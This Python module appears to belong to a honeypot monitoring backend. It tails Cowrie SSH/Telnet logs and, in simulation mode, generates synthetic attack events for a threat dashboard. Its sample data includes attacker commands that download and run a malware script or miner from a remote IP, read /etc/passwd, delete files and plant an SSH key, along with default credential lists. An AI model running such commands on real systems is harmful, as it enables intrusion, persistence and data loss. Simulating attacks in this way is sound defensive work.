import asyncio
import json
import os
import random
import datetime
import uuid
import logging
from typing import Optional, List, Dict, Any
from sqlalchemy.orm import Session

from app.database import SessionLocal
from app.models import HoneypotEvent, Alert, DetectionRule, ThreatIntelIOC
from app.geoip_service import enrich_ip
from app.websocket import manager
from app.config import settings

# Modular Ingestion, Detection, ML, and Correlation components
from app.ingestion.cowrie_parser import CowrieLogParser
from app.ingestion.file_tailer import IncrementalFileTailer
from app.ingestion.base import NormalizedEvent
from app.services.detection_engine import detection_engine
from app.services.incident_correlator import incident_correlator
from app.ml.predictor import predict_single_event
from app.services.event_pipeline import process_normalized_event

logger = logging.getLogger(__name__)

# Sample realistic attack vectors for honeypot demonstration mode
SAMPLE_IPS = [
    "185.220.101.5", "193.142.146.210", "103.253.42.18", "45.154.255.88",
    "194.26.29.112", "104.244.76.13", "182.61.139.88", "91.240.118.24",
    "198.51.100.44", "41.216.186.20", "89.248.165.74", "185.156.177.10"
]

SAMPLE_USERNAMES = ["root", "admin", "user", "support", "ubuntu", "oracle", "postgres", "guest", "test", "cisco"]
SAMPLE_PASSWORDS = ["123456", "admin", "password", "root", "12345678", "pass123", "toor", "cisco123", "admin123", "1234"]
SAMPLE_COMMANDS = [
    "uname -a",
    "cat /etc/passwd",
    "wget http://185.220.101.5/malware.sh -O /tmp/m.sh && chmod +x /tmp/m.sh && /tmp/m.sh",
    "curl -s http://193.142.146.210/miner | bash",
    "ls -la /root",
    "whoami",
    "id",
    "netstat -tulpn",
    "ps aux | grep miner",
    "rm -rf /tmp/*",
    "echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ...' >> ~/.ssh/authorized_keys"
]

EVENT_TYPES = [
    "cowrie.login.failed",
    "cowrie.login.success",
    "cowrie.command.input",
    "cowrie.session.file_download",
    "cowrie.session.connect"
]

# process_normalized_event is imported from app.services.event_pipeline and re-exported here

async def start_cowrie_monitoring():
    """Background task to watch real Cowrie logs with incremental reading and fall back to demonstration telemetry."""
    print("[+] CYVANTIS Threat Ingestion Engine Initialized.")
    tailer = IncrementalFileTailer(settings.COWRIE_LOG_PATH)
    parser = CowrieLogParser()

    while True:
        db: Session = SessionLocal()
        try:
            processed_real_events = False

            # 1. Ingest Real Cowrie Logs incrementally if log file exists
            if os.path.exists(settings.COWRIE_LOG_PATH):
                new_lines = tailer.read_new_lines()
                for line in new_lines:
                    norm_ev = parser.parse_line(line)
                    if norm_ev:
                        await process_normalized_event(norm_ev, db)
                        processed_real_events = True

            # 2. If simulation mode active, emit demonstration telemetry
            if settings.SIMULATION_MODE and not processed_real_events:
                event_type = random.choices(
                    EVENT_TYPES,
                    weights=[50, 20, 20, 5, 5]
                )[0]

                ip = random.choice(SAMPLE_IPS)
                protocol = random.choice(["SSH", "Telnet"])
                dst_port = 22 if protocol == "SSH" else 23

                username = random.choice(SAMPLE_USERNAMES) if event_type != "cowrie.session.connect" else None
                password = random.choice(SAMPLE_PASSWORDS) if event_type in ["cowrie.login.failed", "cowrie.login.success"] else None
                command = random.choice(SAMPLE_COMMANDS) if event_type == "cowrie.command.input" else None
                file_hash = "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855" if event_type == "cowrie.session.file_download" else None

                severity = "low"
                if event_type == "cowrie.login.success":
                    severity = "high"
                elif event_type == "cowrie.command.input":
                    severity = "high" if command and ("wget" in command or "curl" in command) else "medium"
                elif event_type == "cowrie.session.file_download":
                    severity = "critical"

                demo_event = NormalizedEvent(
                    event_id=event_type,
                    timestamp=datetime.datetime.utcnow(),
                    src_ip=ip,
                    dst_port=dst_port,
                    protocol=protocol,
                    username=username,
                    password=password,
                    command=command,
                    file_hash=file_hash,
                    session_id=str(uuid.uuid4())[:8],
                    duration=round(random.uniform(1.2, 45.0), 2),
                    severity=severity,
                    is_simulated=True,
                    data_source="synthetic",
                    raw_payload=json.dumps({"eventid": event_type, "src_ip": ip, "protocol": protocol})
                )
                await process_normalized_event(demo_event, db)

        except Exception as e:
            logger.error("Error in Cowrie ingestion loop: %s", e)
        finally:
            db.close()

        await asyncio.sleep(settings.SIMULATION_INTERVAL_SECONDS)
